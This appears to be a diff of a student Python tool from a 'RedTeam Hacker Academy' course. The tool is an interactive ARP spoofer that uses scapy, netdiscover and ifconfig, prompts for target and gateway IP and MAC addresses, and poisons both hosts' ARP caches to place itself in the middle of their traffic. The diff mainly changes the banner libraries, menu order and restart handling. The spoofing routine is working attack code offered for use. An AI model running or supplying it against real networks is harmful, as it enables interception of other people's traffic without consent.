@@ -2,45 +2,44 @@
 import scapy.all as scapy
 import time
 import sys
-from art import *
-from tabulate import tabulate
+import pyfiglet
+from prettytable import PrettyTable
 import os
 
-tprint("\n  ARP_SPOOFER", "random")
-
-text = """
+banner = pyfiglet.figlet_format("\nARP *\n\tSPOOFER", font="starwars")
+print(banner)
+text = PrettyTable()
+text.field_names = ["C3"]
+text.add_row(["""
           \nHello EVERY ONE !!!                
           \n WELCOME To ARP_Spoofer
-          \n*******************************************    C3       ****************************************
-          
-          presented by : civic v chacko
-          course       : ADCD
-          Institution  : RedTeam Hacker Academy 
+          \n*******************************************    C3       **************************************
 
-             \n***************************************>    Version 0.1   <**********************************
-     """
+       \tpresented by : civic v chacko
+       \n\tcourse       : ADCD
+       \n\t\tInstitution  : RedTeam Hacker Academy 
 
-table = [[text]]
-output = tabulate(table, tablefmt='grid')
+             \n***************************************>    Version 1.0  <*********************************
+     """])
 
-print(output)
+print(text)
 
 
 def restart():
-    os.execv(sys.executable, ['python'] + sys.argv)
+    start = sys.executable
+    os.execl(start, start, *sys.argv)
+
 
 
 options = input("""\n C3 Menu  
 
-          1) Network status
-          2) ALL Networks
+          1) ALL Networks
+          2) Network status
           3) ARP_Spoofer
           \n Enter your option : """)
 
+
 if options == '1':
-    os.system("\nifconfig")
-    print(restart())
-elif options == '2':
     try:
 
         os.system("\nnetdiscover")
@@ -48,16 +47,19 @@ elif options == '2':
         print('interception')
     print(restart())
 
+elif options == '2':
+    os.system("\nifconfig")
+    print(restart())
+
 elif options == '3':
 
     targetIP = str(input("\n\nEnter the target IP : "))
 
     gatewayIP = str(input("Enter the gateway IP  : "))
-    
+
     destinationmac = input("Enter the target MAC : ")
-    
+
     sourceMAC = input("source MAC : ")
-    
 
 
     def spoofer(targetIP, spoofIP):
@@ -87,9 +89,10 @@ elif options == '3':
             time.sleep(2)
     except KeyboardInterrupt:
         print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
-        
+
         restore(targetIP, gatewayIP)
         restore(gatewayIP, targetIP)
+        restart()
 
 
     def spoofer(targetIP, spoofIP):
@@ -100,4 +103,7 @@ elif options == '3':
 
     spoofer(targetIP, gatewayIP)
     spoofer(gatewayIP, targetIP)
-    
+
+elif options >= '4':
+    print("!!!!  Enter a valid Option")
+    restart()
